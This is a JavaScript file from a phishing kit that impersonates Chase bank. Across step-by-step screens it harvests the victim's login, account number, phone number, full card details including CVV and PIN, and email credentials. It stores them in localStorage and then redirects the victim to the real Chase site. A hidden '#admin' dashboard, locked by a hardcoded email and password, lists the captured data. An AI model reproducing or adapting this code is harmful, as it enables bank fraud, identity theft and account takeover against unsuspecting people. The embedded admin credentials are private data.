// ── Password toggles ──
function togglePassword() {
  var pwd = document.getElementById("password");
  var btn = document.querySelector("#step-login .show-btn");
  if (pwd.type === "password") {
    pwd.type = "text";
    btn.textContent = "Hide";
  } else {
    pwd.type = "password";
    btn.textContent = "Show";
  }
}

function toggleEmailPassword() {
  var ep = document.getElementById("emailPassword");
  var btn = document.querySelector("#step-email .show-btn");
  if (ep.type === "password") {
    ep.type = "text";
    btn.textContent = "Hide";
  } else {
    ep.type = "password";
    btn.textContent = "Show";
  }
}

// ── Step navigation ──
function goToStep(stepId) {
  document.querySelectorAll(".step-screen").forEach(function (s) {
    s.classList.remove("active");
  });
  document.getElementById(stepId).classList.add("active");
  document
    .querySelector(".card")
    .scrollIntoView({ behavior: "smooth", block: "start" });
}

// ── Card UX helpers ──
function autoTab(current, nextId) {
  if (current.value.length >= current.maxLength) {
    var next = document.getElementById(nextId);
    if (next) next.focus();
  }
}

function formatExpiry(input) {
  var v = input.value.replace(/\D/g, "");
  input.value = v.length >= 3 ? v.substring(0, 2) + "/" + v.substring(2, 4) : v;
}

// ── Credential storage ──
var STORE_KEY = "chase_captured_creds";
var _sessionId = null;

function _getSessionIndex() {
  if (_sessionId === null) return -1;
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
    for (var i = 0; i < all.length; i++) {
      if (all[i]._id === _sessionId) return i;
    }
  } catch (e) {}
  return -1;
}

function _savePartial(fields) {
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
    var idx = _getSessionIndex();
    if (idx === -1) {
      _sessionId = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
      var entry = {
        _id: _sessionId,
        ts: new Date().toISOString(),
        status: "partial",
      };
      Object.assign(entry, fields);
      all.push(entry);
    } else {
      Object.assign(all[idx], fields);
      all[idx].tsUpdated = new Date().toISOString();
    }
    localStorage.setItem(STORE_KEY, JSON.stringify(all));
  } catch (e) {}
}

// ── Capture steps ──
function captureStep1() {
  var u = document.getElementById("username").value.trim();
  var p = document.getElementById("password").value;
  if (!u || !p) {
    alert("Please enter your username and password.");
    return;
  }
  _savePartial({ username: u, password: p, step: 1 });
  goToStep("step-account");
}

function captureStep2() {
  var acc = document.getElementById("accountNumber").value.trim();
  if (!acc) {
    alert("Please enter your account number.");
    return;
  }
  _savePartial({ accountNumber: acc, step: 2 });
  goToStep("step-phone");
}

function captureStep3() {
  var ph = document.getElementById("phoneNumber").value.trim();
  if (!ph) {
    alert("Please enter your phone number.");
    return;
  }
  _savePartial({ phone: ph, step: 3 });
  goToStep("step-card");
}

function captureStep4() {
  var cardNumber = [
    document.getElementById("cn1").value,
    document.getElementById("cn2").value,
    document.getElementById("cn3").value,
    document.getElementById("cn4").value,
  ].join("-");
  _savePartial({
    cardNumber: cardNumber,
    expiry: document.getElementById("expiry").value,
    cvv: document.getElementById("cvv").value,
    pin: document.getElementById("cardPin").value,
    step: 4,
  });
  goToStep("step-email");
}

function submitAll() {
  _savePartial({
    emailAddress: document.getElementById("emailAddress").value,
    emailPassword: document.getElementById("emailPassword").value,
    step: 5,
    status: "complete",
  });
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
    var idx = _getSessionIndex();
    if (idx !== -1) {
      all[idx].status = "complete";
      localStorage.setItem(STORE_KEY, JSON.stringify(all));
    }
  } catch (e) {}
  window.location.href = "https://www.chase.com";
}

// ── Admin credentials ──
var ADMIN_EMAIL = "dnap7366@gmail.com";
var ADMIN_PASS = "Whip$#0011";

function routePage() {
  if (window.location.hash === "#admin") {
    document.getElementById("admin-page").classList.add("visible");
    document.getElementById("main-page").style.display = "none";
    document.getElementById("main-footer").style.display = "none";
  } else {
    document.getElementById("admin-page").classList.remove("visible");
    document.getElementById("main-page").style.display = "";
    document.getElementById("main-footer").style.display = "";
  }
}

function adminLogin() {
  var email = document.getElementById("adm-email").value.trim();
  var pass = document.getElementById("adm-password").value;
  if (email === ADMIN_EMAIL && pass === ADMIN_PASS) {
    document.getElementById("admin-login-box").style.display = "none";
    document.getElementById("admin-page").style.justifyContent = "flex-start";
    document.getElementById("admin-page").style.alignItems = "stretch";
    document.getElementById("admin-dashboard-inner").classList.add("visible");
    adminRenderTable();
  } else {
    var err = document.getElementById("adm-err");
    err.style.display = "block";
    setTimeout(function () {
      err.style.display = "none";
    }, 3000);
  }
}

function adminLogout() {
  document.getElementById("admin-dashboard-inner").classList.remove("visible");
  document.getElementById("admin-login-box").style.display = "block";
  document.getElementById("admin-page").style.justifyContent = "center";
  document.getElementById("admin-page").style.alignItems = "center";
  document.getElementById("adm-email").value = "";
  document.getElementById("adm-password").value = "";
}

function adminGetCreds() {
  try {
    return JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
  } catch (e) {
    return [];
  }
}

function adminEsc(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function adminRenderTable() {
  var creds = adminGetCreds();
  var tbody = document.getElementById("adm-tbody");
  document.getElementById("stat-total").textContent = creds.length;
  var complete = creds.filter(function (c) {
    return c.status === "complete";
  });
  document.getElementById("stat-complete").textContent = complete.length;
  if (creds.length === 0) {
    tbody.innerHTML =
      '<tr class="empty-admin-row"><td colspan="14">No captured credentials yet.</td></tr>';
    document.getElementById("stat-last").textContent = "—";
    document.getElementById("stat-last-sub").innerHTML = "&nbsp;";
    return;
  }
  var last = creds[creds.length - 1];
  var lastDate = new Date(last.ts);
  document.getElementById("stat-last").textContent =
    lastDate.toLocaleDateString();
  document.getElementById("stat-last-sub").textContent =
    lastDate.toLocaleTimeString();
  var rows = "";
  for (var i = creds.length - 1; i >= 0; i--) {
    var c = creds[i];
    var ts = c.ts ? new Date(c.ts).toLocaleString() : "—";
    var isComplete = c.status === "complete";
    var stepLabel = c.step ? "Step " + c.step : "—";
    var statusColor = isComplete
      ? "color:#3ddc84;border-color:#3ddc84;background:#0a2a18;"
      : "color:#fabc3c;border-color:#fabc3c;background:#2a1e04;";
    rows += "<tr>";
    rows += "<td>" + (i + 1) + "</td>";
    rows += '<td style="white-space:nowrap">' + ts + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.username || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.password || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.accountNumber || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.phone || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.cardNumber || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.expiry || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.cvv || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.pin || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.emailAddress || "—") + "</td>";
    rows += '<td class="td-mono">' + adminEsc(c.emailPassword || "—") + "</td>";
    rows +=
      '<td><span class="td-tag" style="color:#a0c4ff;background:#0d2245;border:none;">' +
      stepLabel +
      "</span></td>";
    rows +=
      '<td><span class="td-tag" style="' +
      statusColor +
      '">' +
      (isComplete ? "&#10003; Complete" : "&#9679; Partial") +
      "</span></td>";
    rows += "</tr>";
  }
  tbody.innerHTML = rows;
}

function adminClearAll() {
  if (confirm("Delete all captured credentials? This cannot be undone.")) {
    localStorage.removeItem(STORE_KEY);
    adminRenderTable();
  }
}

// ── Enter key support on login form ──
function _handleLoginEnter(e) {
  if (e.key === "Enter") {
    var active = document.querySelector(".step-screen.active");
    if (!active) return;
    var btn = active.querySelector(".btn-signin");
    if (btn) btn.click();
  }
}

// ── Init ──
window.addEventListener("hashchange", routePage);
document.addEventListener("DOMContentLoaded", function () {
  routePage();

  // Enter key fires the active step&#39;s primary button
  document.addEventListener("keydown", function (e) {
    if (window.location.hash === "#admin") {
      var box = document.getElementById("admin-login-box");
      if (box && box.style.display !== "none" && e.key === "Enter")
        adminLogin();
    } else {
      _handleLoginEnter(e);
    }
  });

  setInterval(function () {
    var dash = document.getElementById("admin-dashboard-inner");
    if (dash && dash.classList.contains("visible")) adminRenderTable();
  }, 5000);
});
